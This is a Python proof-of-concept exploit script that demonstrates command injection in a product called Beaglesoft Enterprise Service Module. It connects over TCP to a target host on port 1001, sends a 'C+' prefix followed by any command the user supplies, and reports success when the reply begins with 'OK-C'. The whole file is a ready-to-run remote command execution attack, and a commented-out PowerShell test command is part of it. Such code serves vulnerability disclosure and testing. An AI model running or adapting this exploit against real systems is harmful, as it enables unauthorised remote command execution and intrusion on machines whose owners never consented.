import argparse
import socket


def main(args):
    sock = socket.socket()
    sock.connect((args.target, args.port))

    # Command injection will support over 4096 characters
    # Upper limit was not tested beyond that
    #filename = 'C:\\users\\vmuser\\Desktop\\demo.txt'
    #file_contents = 'A' * 4096
    #test_command = f"powershell -c \"Set-Content -Path '{filename}' -Value '{file_contents}'\""
    #command_str = f'C+{test_command}'
    command_str = f'C+{" ".join(args.command)}'

    print(f'[*] Sending "{command_str}" to {args.target}:{args.port}')
    sock.send(b'')
    bytes_sent = sock.send(command_str.encode('utf-8'))
    print(f'[*] {bytes_sent}/{len(command_str)} bytes sent')

    sock.settimeout(10)
    print(f'[*] Waiting for response...')
    try:
        response = sock.recv(100)
        if response.startswith(b'OK-C'):
            print('[+] Success.')
        else:
            print(f'[!] Unexpected response: {response}')
    except socket.timeout:
        print('[-] No response from target')


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        "esm_poc.py",
        description="Demonstrate command injection in Beaglesoft Enterprise Service Module",
    )
    parser.add_argument("target", help="Target IP or Hostname")
    parser.add_argument("command", nargs='+', help="Command to run")
    parser.add_argument("-p", "--port", type=int, default=1001,
                        help="Target port")

    args = parser.parse_args()
    main(args)
